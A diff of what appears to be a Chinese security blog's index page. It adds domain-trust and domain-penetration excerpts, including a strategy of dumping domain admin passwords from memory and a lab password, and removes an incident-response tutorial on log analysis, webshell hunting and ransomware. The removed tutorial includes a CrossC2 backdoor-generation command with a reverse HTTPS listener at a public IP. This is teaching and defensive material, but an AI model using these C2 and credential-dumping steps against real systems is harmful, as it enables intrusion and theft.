@@ -187,6 +187,104 @@
         
 
 <div class="post">
+    <a href="/2024/05/24/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E6%B7%B1%E5%85%A5/">
+        <h2 class="post-title"></h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/24
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>在前面域环境熟悉中已经简单介绍过信任域的概念，接下来就深入讨论域之间的信任关系，网络拓扑图如下，要实现两个域之间的访问就需要建立域信任关系，而在子域和父域之间同样如此</p>
+<p>首先在原来的基础上增加一个新域，也就是外域external.com，网络配置如下</p>
+<pre><code>IP : 10.10.10.100
+子网掩码：255.255.255.0
+默认网关：10.10.10.1
+DNS：10.10.10.10
+根域名：external.com
+还原模式密码：External.com
+</code></pre>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2024/05/24/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E6%B7%B1%E5%85%A5/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/05/16/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+        <h2 class="post-title"></h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/16
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2024/05/16/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/05/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+        <h2 class="post-title"></h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/14
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="域渗透之信息收集"><a href="#域渗透之信息收集" class="headerlink" title="域渗透之信息收集"></a>域渗透之信息收集</h1><h2 id="域渗透思路"><a href="#域渗透思路" class="headerlink" title="域渗透思路"></a>域渗透思路</h2><p>域渗透思路：通过域成员主机，定位出域控制器IP及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机 IP，设法从域成员主机内存中 dump 出域管理员密码，进而拿下域控制器、渗透整个内网</p>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2024/05/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2024/05/12/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%86%9F%E6%82%89/">
         <h2 class="post-title"></h2>
     </a>
@@ -394,156 +492,7 @@
         <div class="content" v-pre>
             
             <h2 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h2><h3 id="WEB-分析-php-amp-javaweb-amp-自动化"><a href="#WEB-分析-php-amp-javaweb-amp-自动化" class="headerlink" title="WEB 分析 php&amp;javaweb&amp;自动化"></a>WEB 分析 php&amp;javaweb&amp;自动化</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p><strong>应急响应：</strong><br>保护阶段，分析阶段，复现阶段，修复阶段，建议阶段<br>目的：分析出攻击时间，攻击操作，攻击后果，安全修复等并给出合理解决方案。</p>
-<p><strong>准备工作：</strong><br>1.收集目标服务器各类信息<br>2.部署相关分析软件及平台等<br>3.整理相关安全渗透工具指纹库<br>4.针对异常表现第一时间触发思路<br>从表现预估入侵面及权限面进行排查</p>
-<p><strong>有明确信息网站被入侵：</strong><br>基于时间 基于操作 基于指纹 基于其他</p>
-<p><strong>无明确信息网站被入侵：</strong><br>1.WEB 漏洞-检查源码类别及漏洞情况<br>2.中间件漏洞-检查对应版本及漏洞情况<br>3.第三方应用漏洞-检查是否存在漏洞应用<br>4.操作系统层面漏洞-检查是否存在系统漏洞<br>5.其他安全问题(口令,后门等)-检查相关应用口令及后门扫描</p>
-<p><strong>常见分析方法：</strong><br>指纹库搜索，日志时间分析，后门追查分析，漏洞检查分析等<br><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-162804.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-zIyjVijq-1651145129320)(image73/73.png)]"></p>
-<h4 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h4><h5 id="Windows-IIS-Sql-日志-搜索"><a href="#Windows-IIS-Sql-日志-搜索" class="headerlink" title="Windows+IIS+Sql-日志,搜索"></a>Windows+<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=IIS&spm=1001.2101.3001.7020">IIS</a>+Sql-日志,搜索</h5><h6 id="故事回顾-某小企业反应自己的网站出现异常，请求支援"><a href="#故事回顾-某小企业反应自己的网站出现异常，请求支援" class="headerlink" title="故事回顾:某小企业反应自己的网站出现异常，请求支援"></a><strong>故事回顾:某小企业反应自己的网站出现异常，请求支援</strong></h6><p>查找日志路径</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-162948.png" alt="img-9M7LAf35-1651145129321)"></p>
-<p>日志功能IIS是默认开启的（如果站长关闭了日志，那就很遗憾只能从别的方面进行分析）</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-163023.png" alt="img-bco2s2d2-1651145129322"></p>
-<p>查找日志文件</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-163058.png" alt="img-T4SIAWkw-1651145129322"></p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-163119.png" alt="img-7jC4tpjk-1651145129323"></p>
-<p>查看日志文件</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-163212.png" alt="img-q3ZVwr5f-1651145129324"></p>
-<p>日志默认记录事项（可自由设置）</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-163242.png" alt="img-SSzi0rdk-1651145129324"></p>
-<p>可以进行指纹库搜索，比如sqlmap</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-163301.png" alt="在这里插入图片描述"></p>
-<p>也可以进行关键字搜索，比如select</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-163326.png" alt="img-qyDT3gp9-1651145129326"></p>
-<h4 id="Linux-BT-Nginx-tp5-日志-后门"><a href="#Linux-BT-Nginx-tp5-日志-后门" class="headerlink" title="Linux+BT_Nginx+tp5-日志,后门"></a>Linux+BT_Nginx+tp5-日志,后门</h4><p><strong>故事回顾:某黑x哥哥反应自己的网站出现异常，请求支援</strong></p>
-<h5 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h5><ul>
-<li><h6 id="查找日志"><a href="#查找日志" class="headerlink" title="查找日志"></a><strong>查找日志</strong></h6></li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-164758.png" alt="img-2AnU3LsD-1651145129326"></p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-164856.png" alt="img-B0l4XzpS-1651145129327"></p>
-<ul>
-<li><h6 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析"></a><strong>日志分析</strong></h6></li>
-<li><h6 id="典型目录文件扫描"><a href="#典型目录文件扫描" class="headerlink" title="典型目录文件扫描"></a>典型目录文件扫描</h6></li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-165058.png" alt="img-Uub5pSsI-1651145129327"></p>
-<ul>
-<li><h6 id="蚁剑连接后门"><a href="#蚁剑连接后门" class="headerlink" title="蚁剑连接后门"></a><strong>蚁剑连接后门</strong></h6></li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-165205.png" alt="img-OuNeggEc-1651145129328"></p>
-<ul>
-<li><h6 id="利用ThinkPHP5漏洞"><a href="#利用ThinkPHP5漏洞" class="headerlink" title="利用ThinkPHP5漏洞"></a>利用ThinkPHP5漏洞</h6><p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-165250.png" alt="img-ux2KQT5F-1651145129328"></p>
-</li>
-<li><h6 id="尝试模拟访问攻击（按照日志一条条测试）"><a href="#尝试模拟访问攻击（按照日志一条条测试）" class="headerlink" title="尝试模拟访问攻击（按照日志一条条测试）"></a>尝试模拟访问攻击（按照日志一条条测试）</h6><p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-165701.png" alt="在这里插入图片描述"></p>
-</li>
-</ul>
-<h5 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h5><ul>
-<li><p>目录查杀，后门脚本</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-171511.png" alt="img-1GZAEvMz-1651145129329"></p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-171441.png" alt="img-TWfVRKrB-1651145129329"></p>
-</li>
-</ul>
-<h5 id="工具分析"><a href="#工具分析" class="headerlink" title="工具分析"></a>工具分析</h5><h5 id="推荐-10个好用的Web日志安全分析工具"><a href="#推荐-10个好用的Web日志安全分析工具" class="headerlink" title="推荐 | 10个好用的Web日志安全分析工具"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/13198071.html">推荐 | 10个好用的Web日志安全分析工具</a></h5><h4 id="Linux-Javaweb-st2-日志-后门-时间"><a href="#Linux-Javaweb-st2-日志-后门-时间" class="headerlink" title="Linux+Javaweb+st2-日志,后门,时间"></a>Linux+Javaweb+st2-日志,后门,时间</h4><p>根据webshell关键字找到是谁，在何时上传了后门，何时利用</p>
-<p>日志太多，使用工具-FileSeek文件搜索工具</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-172210.png" alt="img-4cjH9HcL-1651145129330"></p>
-<h4 id="360-星图日志自动分析工具-演示-展望"><a href="#360-星图日志自动分析工具-演示-展望" class="headerlink" title="360 星图日志自动分析工具-演示,展望"></a>360 星图日志自动分析工具-演示,展望</h4><p><strong>缺点：</strong><br>支持的日志类型较少，智能用于小网站日志分析，对于数据量很大的网站不适合</p>
-<p><strong>下载地址：</strong><br>目前官方已经停止维护，可自己百度下载</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-172255.png" alt="img-cIiugikT-1651145129330"></p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-172307.png" alt="img-nsYsjxzn-1651145129330"></p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-172703.png" alt="img-L03sj8ig-1651145129331"></p>
-<h4 id="涉及资源："><a href="#涉及资源：" class="headerlink" title="涉及资源："></a>涉及资源：</h4><p><a target="_blank" rel="noopener" href="https://www.pcsoft.com.cn/soft/15718.html">360星图</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/13198071.html">推荐 | 10个好用的Web日志安全分析工具</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/12679777.html">10款常见的Webshell检测工具</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/12679777.html">10款常见的Webshell检测工具</a></p>
-<h3 id="win-amp-linux-分析后门-amp-勒索病毒"><a href="#win-amp-linux-分析后门-amp-勒索病毒" class="headerlink" title="win&amp;linux 分析后门&amp;勒索病毒"></a>win&amp;linux 分析后门&amp;勒索病毒</h3><h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><p>操作系统(windows,linux)应急响应：<br>1.常见危害：暴力破解，漏洞利用，流量攻击，木马控制(Webshell,PC 木马等)，病毒感染(挖矿，蠕<br>虫，勒索等)。</p>
-<p>2.常见分析：计算机账户，端口，进程，网络，启动，服务，任务，文件等安全问题</p>
-<p><strong>常见日志类别及存储：</strong><br>Windows,Linux</p>
-<h5 id="补充资料："><a href="#补充资料：" class="headerlink" title="补充资料："></a>补充资料：</h5><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/485">https://xz.aliyun.com/t/485</a><br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/114019.html">https://www.secpulse.com/archives/114019.html</a><br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/">https://docs.microsoft.com/en-us/sysinternals/</a></p>
-<h5 id="病毒分析"><a href="#病毒分析" class="headerlink" title="病毒分析"></a>病毒分析</h5><p>PCHunter：<a target="_blank" rel="noopener" href="http://www.xuetr.com/">http://www.xuetr.com</a><br>火绒剑：<a target="_blank" rel="noopener" href="https://www.huorong.cn/">https://www.huorong.cn</a><br>Process Explorer：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a><br>processhacker：<a target="_blank" rel="noopener" href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a><br>autoruns：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a><br>OTL：<a target="_blank" rel="noopener" href="https://www.bleepingcomputer.com/download/otl/">https://www.bleepingcomputer.com/download/otl/</a><br>SysInspector：<a target="_blank" rel="noopener" href="http://download.eset.com.cn/download/detail/?product=sysinspector">http://download.eset.com.cn/download/detail/?product=sysinspector</a></p>
-<h5 id="病毒查杀"><a href="#病毒查杀" class="headerlink" title="病毒查杀"></a>病毒查杀</h5><p>卡巴斯基：<a target="_blank" rel="noopener" href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a><br>大蜘蛛：<a target="_blank" rel="noopener" href="http://free.drweb.ru/download+cureit+free">http://free.drweb.ru/download+cureit+free</a><br>火绒安全软件：<a target="_blank" rel="noopener" href="https://www.huorong.cn/">https://www.huorong.cn</a><br>360 杀毒：<a target="_blank" rel="noopener" href="http://sd.360.cn/download_center.html">http://sd.360.cn/download_center.html</a></p>
-<h5 id="病毒动态"><a href="#病毒动态" class="headerlink" title="病毒动态"></a>病毒动态</h5><p>CVERC-国家计算机病毒应急处理中心：<a target="_blank" rel="noopener" href="http://www.cverc.org.cn/">http://www.cverc.org.cn</a><br>微步在线威胁情报社区：<a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn</a><br>火绒安全论坛：<a target="_blank" rel="noopener" href="http://bbs.huorong.cn/forum-59-1.html">http://bbs.huorong.cn/forum-59-1.html</a><br>爱毒霸社区：<a target="_blank" rel="noopener" href="http://bbs.duba.net/">http://bbs.duba.net</a><br>腾讯电脑管家：<a target="_blank" rel="noopener" href="http://bbs.guanjia.qq.com/forum-2-1.html">http://bbs.guanjia.qq.com/forum-2-1.html</a></p>
-<h5 id="在线病毒扫描网站"><a href="#在线病毒扫描网站" class="headerlink" title="在线病毒扫描网站"></a>在线病毒扫描网站</h5><p>多引擎在线病毒扫描网/ /<a target="_blank" rel="noopener" href="http://www.virscan.org/">http://www.virscan.org</a><br>腾讯哈勃分析系统/ /<a target="_blank" rel="noopener" href="https://habo.qq.com/">https://habo.qq.com</a><br>Jotti 恶意软件扫描系统/ /<a target="_blank" rel="noopener" href="https://virusscan.jotti.org/">https://virusscan.jotti.org</a><br>计算机病毒、手机病毒、可疑文件分析 //<a target="_blank" rel="noopener" href="http://www.scanvir.com/">http://www.scanvir.com</a></p>
-<h4 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h4><h5 id="攻击响应-暴力破解-RDP-SSH-Win-Linux"><a href="#攻击响应-暴力破解-RDP-SSH-Win-Linux" class="headerlink" title="攻击响应-暴力破解(RDP,SSH)-Win,Linux"></a>攻击响应-暴力破解(<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=RDP&spm=1001.2101.3001.7020">RDP</a>,SSH)-Win,Linux</h5><h6 id="案例-1-攻击响应-暴力破解-RDP-SSH-Win-Linux"><a href="#案例-1-攻击响应-暴力破解-RDP-SSH-Win-Linux" class="headerlink" title="案例 1-攻击响应-暴力破解(RDP,SSH)-Win,Linux"></a><strong>案例 1-攻击响应-暴力破解(RDP,SSH)-Win,Linux</strong></h6><p><strong>Windows-LogFusion 载入查看</strong></p>
-<p>事件归类，事件 ID，事件状态等，参考百度资料</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-202651.png" alt="img-QuVpyR6s-1651145636557"></p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-202655.png" alt="img-m2zsdDML-1651145636558"></p>
-<h5 id="Linux-grep-筛选"><a href="#Linux-grep-筛选" class="headerlink" title="Linux-grep 筛选"></a>Linux-grep 筛选</h5><p>1、统计了下日志，确认服务器遭受多少次暴力破解</p>
-<pre><code class="shell">grep -o &quot;Failed password&quot; /var/log/secure|uniq -c 
-</code></pre>
-<p>2、输出登录爆破的第一行和最后一行，确认爆破时间范围：</p>
-<pre><code class="shell">grep &quot;Failed password&quot; /var/log/secure|head -1
-grep &quot;Failed password&quot; /var/log/secure|tail -1
-</code></pre>
-<p>3、进一步定位有哪些 IP 在爆破？</p>
-<pre><code class="shell">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0- 9]?)&quot;|uniq -c | s
-</code></pre>
-<p>4、爆破用户名字典都有哪些？</p>
-<pre><code class="shell">grep &quot;Failed password&quot; /var/log/secure|perl -e &#39;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#39;|uniq -c|sort -nr
-</code></pre>
-<p>5、登录成功的日期、用户名、IP：</p>
-<pre><code class="shell">grep &quot;Accepted &quot; /var/log/secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;
-grep &quot;Accepted &quot; /var/log/secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more
-</code></pre>
-<h5 id="控制响应-后门木马-Webshell-PC-Win-Linux"><a href="#控制响应-后门木马-Webshell-PC-Win-Linux" class="headerlink" title="控制响应-后门木马(Webshell,PC)-Win,Linux"></a>控制响应-后门木马(Webshell,PC)-Win,Linux</h5><p>windows：默认配置测试<br>linux 借助 CrossC2 项目：netstat -ntulp<br><a target="_blank" rel="noopener" href="https://github.com/gloxec/CrossC2">https://github.com/gloxec/CrossC2</a><br><a target="_blank" rel="noopener" href="https://github.com/darkr4y/geacon">https://github.com/darkr4y/geacon</a><br>参考过程：<a target="_blank" rel="noopener" href="http://www.adminxe.com/1287.html">http://www.adminxe.com/1287.html</a></p>
-<p>1.项目上传至服务端目录，给予执行权限<br>2.配置监听器：<br>windows/beacon_https/reverse_https 阿里云记得端口放行<br>3.生成后门：<br>./genCrossC2.Linux 47.99.49.65 5566 null null Linux x64 C2<br>通过网络监听工具及 windows 日志分析或执行记录查找后门问题</p>
-<h5 id="危害响应-病毒感染-勒索-WannaCry-Windows"><a href="#危害响应-病毒感染-勒索-WannaCry-Windows" class="headerlink" title="危害响应-病毒感染(勒索 WannaCry)-Windows"></a>危害响应-病毒感染(勒索 WannaCry)-Windows</h5><h6 id="案例-3-危害响应-病毒感染-勒索-WannaCry-Windows"><a href="#案例-3-危害响应-病毒感染-勒索-WannaCry-Windows" class="headerlink" title="案例 3-危害响应-病毒感染(勒索 WannaCry)-Windows"></a>案例 3-危害响应-病毒感染(勒索 WannaCry)-Windows</h6><p>详细说明中毒表现及恢复指南</p>
-<p>可以使用360勒索病毒解密网站进行病毒查询、在线解密等。<br>nomoreransom网站尝试解密。<br>请专业团队进行恢复<br>自动化响应检测-Gscan 多</p>
-<h5 id="自动化响应检测-Gscan-多重功能脚本测试-Linux"><a href="#自动化响应检测-Gscan-多重功能脚本测试-Linux" class="headerlink" title="自动化响应检测-Gscan 多重功能脚本测试-Linux"></a>自动化响应检测-Gscan 多重功能脚本测试-Linux</h5><h6 id="案例-4-自动化响应检测-Gscan-多重功能脚本测试-Linux"><a href="#案例-4-自动化响应检测-Gscan-多重功能脚本测试-Linux" class="headerlink" title="案例 4-自动化响应检测-Gscan 多重功能脚本测试-Linux"></a>案例 4-自动化响应检测-Gscan 多重功能脚本测试-Linux</h6><p>参考：<a target="_blank" rel="noopener" href="https://github.com/grayddq/GScan/">https://github.com/grayddq/GScan/</a><br>自动化响应检测工具：GScan、chkrootkit、rkhunter、lynis<br>都下载一下，以备不时之需，应急响应时全都跑一遍<br>执行Gscan脚本即可<br>python3 Gscan.py</p>
-<p>可以看到，黑客进行了哪些攻击行为，是否成功等等。</p>
-<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240416-205209.png" alt="img-T8y8lE1U-1651145636559"></p>
-<p>涉及资源：<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/485">https://xz.aliyun.com/t/485</a><br><a target="_blank" rel="noopener" href="https://lesuobingdu.360.cn/">https://lesuobingdu.360.cn/</a><br><a target="_blank" rel="noopener" href="https://github.com/gloxec/CrossC2/">https://github.com/gloxec/CrossC2/</a><br><a target="_blank" rel="noopener" href="https://github.com/darkr4y/geacon/">https://github.com/darkr4y/geacon/</a><br><a target="_blank" rel="noopener" href="https://github.com/grayddq/GScan/">https://github.com/grayddq/GScan/</a><br><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-217586-1.htm">https://bbs.pediy.com/thread-217586-1.htm</a><br><a target="_blank" rel="noopener" href="https://www.nomoreransom.org/zh/index.html">https://www.nomoreransom.org/zh/index.html</a><br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/">https://docs.microsoft.com/en-us/sysinternals/</a><br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/114019.html">https://www.secpulse.com/archives/114019.html</a><br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1tQS1mUelmEh3I68AL7yXGg">https://pan.baidu.com/s/1tQS1mUelmEh3I68AL7yXGg</a> 提取码：xiao</p>
-<h3 id="数据库-amp-漏洞口令检索-amp-应急取证箱"><a href="#数据库-amp-漏洞口令检索-amp-应急取证箱" class="headerlink" title="数据库&amp;漏洞口令检索&amp;应急取证箱"></a>数据库&amp;漏洞口令检索&amp;应急取证箱</h3><h4 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h4><p><strong>必须知识点：</strong></p>
-<ul>
-<li>1.第三方应用由于是选择性安装，如何做好信息收集和漏洞探针也是获取攻击者思路的重要操作，除去本身漏洞外，提前预知或口令相关攻击也要进行筛选。</li>
-<li>2.排除三方应用攻击行为，自查漏洞分析攻击者思路，人工配合工具脚本</li>
-<li>3.由于工具或脚本更新迭代快，分类复杂，打造自己的工具箱迫在眉睫</li>
-</ul>
-<h4 id="演示案例-1"><a href="#演示案例-1" class="headerlink" title="演示案例"></a>演示案例</h4><h5 id="系统日志-Win-日志自动神器-LogonTracer-外网内网日志"><a href="#系统日志-Win-日志自动神器-LogonTracer-外网内网日志" class="headerlink" title="系统日志-Win 日志自动神器 LogonTracer-外网内网日志"></a>系统日志-Win 日志自动神器 LogonTracer-外网内网日志</h5><pre><code>案例 1-Win 日志自动神器 LogonTracer-外网内网
-如何安装使用：https://github.com/JPCERTCC/LogonTracer/wiki/
-linux 安装使用笔记：阿里云主机记得开放端口及关闭防火墙
-1.下载并解压 neo4j：tar -zvxf neo4j-community-4.2.1-unix.tar
-2.安装 java11 环境：sudo yum install java-11-openjdk -y
-3.修改 neo4j 配置保证外部访问：
-dbms.connector.bolt.listen_address=0.0.0.0:7687
-dbms.connector.http.listen_address=0.0.0.0:7474
-./bin/neo4j console &amp;
-4.下载 LogonTracer 并安装库：
-git clone https://github.com/JPCERTCC/LogonTracer.git
-pip3 install -r requirements.txt
-5.启动 LogonTracer 并导入日志文件分析
-python3 logontracer.py -r -o [PORT] -u [USERNAME] -p [PASSWORD] -s [IP 地址]
-python3 logontracer.py -r -o 8080 -u neo4j -p xiaodi -s 47.98.99.126
-python3 logontracer.py -e [EVTX 文件] -z [时区] -u [用户名] -p [密码] -s [IP 地址]
-python3 logontracer.py -e Security.evtx -z -13 -u neo4j -p xiaodi -s 127.0.0.1
-6.刷新访问 LogonTracer-web_gui 查看分析结果
-</code></pre>
-<h4 id="应用分析-数据库-Mysql-amp-Mssql-amp-Oracle-等分析-爆破注入操作"><a href="#应用分析-数据库-Mysql-amp-Mssql-amp-Oracle-等分析-爆破注入操作" class="headerlink" title="应用分析-数据库 Mysql&amp;Mssql&amp;Oracle 等分析-爆破注入操作"></a>应用分析-数据库 Mysql&amp;Mssql&amp;Oracle 等分析-爆破注入操作</h4><pre><code>案例 2-数据库 Mysql&amp;Mssql&amp;Oracle 等日志分析-爆破注入操作
-常见的数据库攻击包括弱口令、SQL 注入、提升权限、窃取备份等。对数据库日志进行分析，可以
-发现攻击行为，进一步还原攻击场景及追溯攻击源。
-Mysql：启用，记录，分析（分析 SQL 注入及口令登录爆破等）
-show variables like &#39;%general%&#39;;
-SET GLOBAL general_log = &#39;On&#39;;
-SET GLOBAL general_log_file = &#39;/var/lib/mysql/mysql.log&#39;;
-Mssql：查看，跟踪，分析（配置跟踪可分析操作，查看日志可分析登录等）
-</code></pre>
-<h4 id="模拟测试-自查漏洞模拟渗透测试寻找攻击源头-漏洞口令检索"><a href="#模拟测试-自查漏洞模拟渗透测试寻找攻击源头-漏洞口令检索" class="headerlink" title="模拟测试-自查漏洞模拟渗透测试寻找攻击源头-漏洞口令检索"></a>模拟测试-自查漏洞模拟渗透测试寻找攻击源头-漏洞口令检索</h4><pre><code>案例 3-自查漏洞模拟渗透测试寻找攻击源头-漏洞口令检索
-1.日志被删除或没价值信息
-2.没有思路进行分析可以采用模拟渗透
-1.windows，linux 系统漏洞自查:
-WindowsVulnScan,linux-exploit-suggester
-D:\Myproject\venv\Scripts\python.exe cve-check.py -C -f KB.json
-./linux-exploit-suggester.sh
-2.windows，linux 服务漏洞自查:
-windows：Get-WmiObject -class Win32_Product
-linux：LinEnum.sh
-searchsploit weblogic
-利用前期信息收集配合 searchsploit 进行应用服务协议等漏洞检索
-3.windows，linux 协议弱口令自查-工具探针或人工获取判断-snetcraker
-</code></pre>
-<h4 id="专业要求-自动化-ir-rescue-应急响应取证工具箱-实时为您提供服务"><a href="#专业要求-自动化-ir-rescue-应急响应取证工具箱-实时为您提供服务" class="headerlink" title="专业要求-自动化 ir-rescue 应急响应取证工具箱-实时为您提供服务"></a>专业要求-自动化 ir-rescue 应急响应取证工具箱-实时为您提供服务</h4><pre><code>案例 4-自动化 ir-rescue 应急响应工具箱-实时为您提供服务
-https://github.com/diogo-fernan/ir-rescue
-分析脚本工具原理，尝试自己进行编写修改，成为自己的工具箱杀器
-</code></pre>
-<h4 id="涉及资源：-1"><a href="#涉及资源：-1" class="headerlink" title="涉及资源："></a>涉及资源：</h4><p><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a><br><a target="_blank" rel="noopener" href="https://github.com/diogo-fernan/ir-rescue">https://github.com/diogo-fernan/ir-rescue</a><br><a target="_blank" rel="noopener" href="https://github.com/offensive-security/exploitdb">https://github.com/offensive-security/exploitdb</a><br><a target="_blank" rel="noopener" href="https://github.com/chroblert/WindowsVulnScan">https://github.com/chroblert/WindowsVulnScan</a><br><a target="_blank" rel="noopener" href="https://github.com/JPCERTCC/LogonTracer.git">https://github.com/JPCERTCC/LogonTracer.git</a><br><a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a><br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1tQS1mUelmEh3I68AL7yXGg">https://pan.baidu.com/s/1tQS1mUelmEh3I68AL7yXGg</a> 提取码：xiao</p>
-<p>参考链接：</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/MCTSOG/article/details/124481639">第73天-应急响应-WEB 分析 php&amp;javaweb&amp;自动化_第73天-应急响应-web分析-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/MCTSOG/article/details/124481803">第74天-应急响应-win&amp;linux 分析后门&amp;勒索病毒&amp;攻_logfusion-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/MCTSOG/article/details/124481915">第75天-应急响应-数据库&amp;漏洞口令检索&amp;应急取证箱_数据库应急响应-CSDN博客</a></p>
-
